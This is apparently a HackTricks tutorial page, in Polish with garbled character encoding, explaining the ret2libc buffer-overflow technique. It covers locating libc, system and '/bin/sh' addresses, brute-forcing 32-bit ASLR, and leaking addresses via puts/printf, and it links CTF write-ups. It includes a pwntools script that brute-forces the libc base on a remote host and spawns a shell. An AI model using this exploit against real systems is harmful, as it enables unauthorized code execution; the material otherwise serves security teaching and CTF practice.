# Ret2lib

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## **Podstawowe informacje**

IstotÄ… **Ret2Libc** jest przekierowanie przepÅ‚ywu wykonania podatnego programu do funkcji w bibliotece wspÃ³Å‚dzielonej (np. **system**, **execve**, **strcpy**) zamiast wykonywania dostarczonego przez atakujÄ…cego shellcode na stosie. AtakujÄ…cy tworzy Å‚adunek, ktÃ³ry modyfikuje adres powrotu na stosie, aby wskazywaÅ‚ na poÅ¼Ä…danÄ… funkcjÄ™ biblioteki, jednoczeÅ›nie zapewniajÄ…c, Å¼e wszelkie niezbÄ™dne argumenty sÄ… poprawnie ustawione zgodnie z konwencjÄ… wywoÅ‚ania.

### **PrzykÅ‚adowe kroki (uproszczone)**

* Uzyskaj adres funkcji do wywoÅ‚ania (np. system) i polecenie do wywoÅ‚ania (np. /bin/sh)
* Wygeneruj Å‚aÅ„cuch ROP, aby przekazaÄ‡ pierwszy argument wskazujÄ…cy na ciÄ…g polecenia oraz przepÅ‚yw wykonania do funkcji

## Znajdowanie adresÃ³w

* ZakÅ‚adajÄ…c, Å¼e uÅ¼ywana `libc` to ta z bieÅ¼Ä…cej maszyny, moÅ¼esz znaleÅºÄ‡, gdzie zostanie zaÅ‚adowana w pamiÄ™ci za pomocÄ…: 

{% code overflow="wrap" %}
```bash
ldd /path/to/executable | grep libc.so.6 #Address (if ASLR, then this change every time)
```
{% endcode %}

JeÅ›li chcesz sprawdziÄ‡, czy ASLR zmienia adres libc, moÅ¼esz to zrobiÄ‡:
```bash
for i in `seq 0 20`; do ldd ./<bin> | grep libc; done
```
* ZnajÄ…c uÅ¼ywanÄ… libc, moÅ¼liwe jest rÃ³wnieÅ¼ znalezienie offsetu do funkcji `system` za pomocÄ…:
```bash
readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system
```
* ZnajÄ…c uÅ¼ywanÄ… libc, moÅ¼liwe jest rÃ³wnieÅ¼ znalezienie przesuniÄ™cia do funkcji Å‚aÅ„cucha `/bin/sh` za pomocÄ…:
```bash
strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh
```
### UÅ¼ywanie gdb-peda / GEF

ZnajÄ…c uÅ¼ywanÄ… libc, moÅ¼liwe jest rÃ³wnieÅ¼ uÅ¼ycie Peda lub GEF, aby uzyskaÄ‡ adres funkcji **system**, funkcji **exit** oraz ciÄ…gu **`/bin/sh`** :
```bash
p system
p exit
find "/bin/sh"
```
### UÅ¼ywanie /proc/\<PID>/maps

JeÅ›li proces tworzy **dzieci** za kaÅ¼dym razem, gdy z nim rozmawiasz (serwer sieciowy), sprÃ³buj **przeczytaÄ‡** ten plik (prawdopodobnie bÄ™dziesz musiaÅ‚ byÄ‡ rootem).

Tutaj moÅ¼esz znaleÅºÄ‡ **dokÅ‚adnie, gdzie zaÅ‚adowana jest libc** wewnÄ…trz procesu i **gdzie bÄ™dzie zaÅ‚adowana** dla kaÅ¼dego dziecka procesu.

![](<../../../.gitbook/assets/image (853).png>)

W tym przypadku jest zaÅ‚adowana w **0xb75dc000** (To bÄ™dzie adres bazowy libc)

## Nieznana libc

MoÅ¼e siÄ™ zdarzyÄ‡, Å¼e **nie znasz libc, ktÃ³rÄ… Å‚aduje binarka** (poniewaÅ¼ moÅ¼e byÄ‡ zlokalizowana na serwerze, do ktÃ³rego nie masz dostÄ™pu). W takim przypadku moÅ¼esz wykorzystaÄ‡ lukÄ™, aby **wyciekowaÄ‡ niektÃ³re adresy i znaleÅºÄ‡, ktÃ³ra biblioteka libc** jest uÅ¼ywana:

{% content-ref url="rop-leaking-libc-address/" %}
[rop-leaking-libc-address](rop-leaking-libc-address/)
{% endcontent-ref %}

A szablon pwntools do tego znajdziesz w:

{% content-ref url="rop-leaking-libc-address/rop-leaking-libc-template.md" %}
[rop-leaking-libc-template.md](rop-leaking-libc-address/rop-leaking-libc-template.md)
{% endcontent-ref %}

### ZnajomoÅ›Ä‡ libc z 2 offsetami

SprawdÅº stronÄ™ [https://libc.blukat.me/](https://libc.blukat.me/) i uÅ¼yj **kilku adresÃ³w** funkcji wewnÄ…trz libc, aby dowiedzieÄ‡ siÄ™ o **uÅ¼ywanej wersji**.

## ObejÅ›cie ASLR w 32 bitach

Te ataki brute-force sÄ… **przydatne tylko dla systemÃ³w 32-bitowych**.

* JeÅ›li exploit jest lokalny, moÅ¼esz sprÃ³bowaÄ‡ brute-force'owaÄ‡ adres bazowy libc (przydatne dla systemÃ³w 32-bitowych):
```python
for off in range(0xb7000000, 0xb8000000, 0x1000):
```
* JeÅ›li atakujesz zdalny serwer, moÅ¼esz sprÃ³bowaÄ‡ **brute-force'owaÄ‡ adres funkcji `usleep` z `libc`**, przekazujÄ…c jako argument 10 (na przykÅ‚ad). JeÅ›li w pewnym momencie **serwer odpowiada o 10s dÅ‚uÅ¼ej**, znalazÅ‚eÅ› adres tej funkcji.

## One Gadget

Wykonaj powÅ‚okÄ™, skaczÄ…c do **jednego** konkretnego **adresu** w libc:

{% content-ref url="one-gadget.md" %}
[one-gadget.md](one-gadget.md)
{% endcontent-ref %}

## x86 Ret2lib Code Example

W tym przykÅ‚adzie brute-force ASLR jest zintegrowany w kodzie, a podatny binarny plik znajduje siÄ™ na zdalnym serwerze:
```python
from pwn import *

c = remote('192.168.85.181',20002)
c.recvline()

for off in range(0xb7000000, 0xb8000000, 0x1000):
p = ""
p += p32(off + 0x0003cb20) #system
p += "CCCC" #GARBAGE, could be address of exit()
p += p32(off + 0x001388da) #/bin/sh
payload = 'A'*0x20010 + p
c.send(payload)
c.interactive()
```
## x64 Ret2lib Code Example

SprawdÅº przykÅ‚ad z:

{% content-ref url="../" %}
[..](../)
{% endcontent-ref %}

## ARM64 Ret2lib Example

W przypadku ARM64 instrukcja ret skacze tam, gdzie wskazuje rejestr x30, a nie tam, gdzie wskazuje rejestr stosu. WiÄ™c jest to trochÄ™ bardziej skomplikowane.

RÃ³wnieÅ¼ w ARM64 instrukcja robi to, co robi instrukcja (nie moÅ¼na skakaÄ‡ w Å›rodku instrukcji i przeksztaÅ‚caÄ‡ ich w nowe).

SprawdÅº przykÅ‚ad z:

{% content-ref url="ret2lib-+-printf-leak-arm64.md" %}
[ret2lib-+-printf-leak-arm64.md](ret2lib-+-printf-leak-arm64.md)
{% endcontent-ref %}

## Ret-into-printf (lub puts)

To pozwala na **wyciek informacji z procesu** poprzez wywoÅ‚anie `printf`/`puts` z pewnymi specyficznymi danymi umieszczonymi jako argument. Na przykÅ‚ad umieszczenie adresu `puts` w GOT w wykonaniu `puts` spowoduje **wyciek adresu `puts` w pamiÄ™ci**.

## Ret2printf

To zasadniczo oznacza naduÅ¼ywanie **Ret2lib, aby przeksztaÅ‚ciÄ‡ go w podatnoÅ›Ä‡ na formatowanie ciÄ…gÃ³w `printf`** poprzez uÅ¼ycie `ret2lib` do wywoÅ‚ania printf z wartoÅ›ciami do wykorzystania (brzmi bezuÅ¼ytecznie, ale moÅ¼liwe):

{% content-ref url="../../format-strings/" %}
[format-strings](../../format-strings/)
{% endcontent-ref %}

## Inne przykÅ‚ady i odniesienia

* [https://guyinatuxedo.github.io/08-bof\_dynamic/csaw19\_babyboi/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/csaw19\_babyboi/index.html)
* Ret2lib, pod warunkiem wycieku adresu funkcji w libc, uÅ¼ywajÄ…c jednego gadÅ¼etu
* [https://guyinatuxedo.github.io/08-bof\_dynamic/csawquals17\_svc/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/csawquals17\_svc/index.html)
* 64 bity, ASLR wÅ‚Ä…czone, ale bez PIE, pierwszym krokiem jest wypeÅ‚nienie przepeÅ‚nienia do bajtu 0x00 kanarka, aby nastÄ™pnie wywoÅ‚aÄ‡ puts i wyciek. Z kanarkiem tworzony jest gadÅ¼et ROP do wywoÅ‚ania puts, aby wyciekÅ‚ adres puts z GOT, a nastÄ™pnie gadÅ¼et ROP do wywoÅ‚ania `system('/bin/sh')`
* [https://guyinatuxedo.github.io/08-bof\_dynamic/fb19\_overfloat/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/fb19\_overfloat/index.html)
* 64 bity, ASLR wÅ‚Ä…czone, brak kanarka, przepeÅ‚nienie stosu w main z funkcji podrzÄ™dnej. GadÅ¼et ROP do wywoÅ‚ania puts, aby wyciekÅ‚ adres puts z GOT, a nastÄ™pnie wywoÅ‚anie jednego gadÅ¼etu.
* [https://guyinatuxedo.github.io/08-bof\_dynamic/hs19\_storytime/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/hs19\_storytime/index.html)
* 64 bity, brak pie, brak kanarka, brak relro, nx. UÅ¼ywa funkcji write do wycieku adresu write (libc) i wywoÅ‚uje jeden gadÅ¼et.
* [https://guyinatuxedo.github.io/14-ret\_2\_system/asis17\_marymorton/index.html](https://guyinatuxedo.github.io/14-ret\_2\_system/asis17\_marymorton/index.html)
* UÅ¼ywa ciÄ…gu formatu do wycieku kanarka ze stosu i przepeÅ‚nienia bufora, aby wywoÅ‚aÄ‡ system (jest w GOT) z adresem `/bin/sh`.
* [https://guyinatuxedo.github.io/14-ret\_2\_system/tu\_guestbook/index.html](https://guyinatuxedo.github.io/14-ret\_2\_system/tu\_guestbook/index.html)
* 32 bity, brak relro, brak kanarka, nx, pie. NaduÅ¼ywa zÅ‚ego indeksowania, aby wyciekaÄ‡ adresy libc i heap ze stosu. NaduÅ¼ywa przepeÅ‚nienia bufora, aby wykonaÄ‡ ret2lib wywoÅ‚ujÄ…c `system('/bin/sh')` (adres heap jest potrzebny do ominiÄ™cia sprawdzenia).

{% hint style="success" %}
Ucz siÄ™ i Ä‡wicz Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Ucz siÄ™ i Ä‡wicz Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie dla HackTricks</summary>

* SprawdÅº [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegram**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podziel siÄ™ sztuczkami hackingowymi, przesyÅ‚ajÄ…c PR do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriÃ³w github.

</details>
{% endhint %}
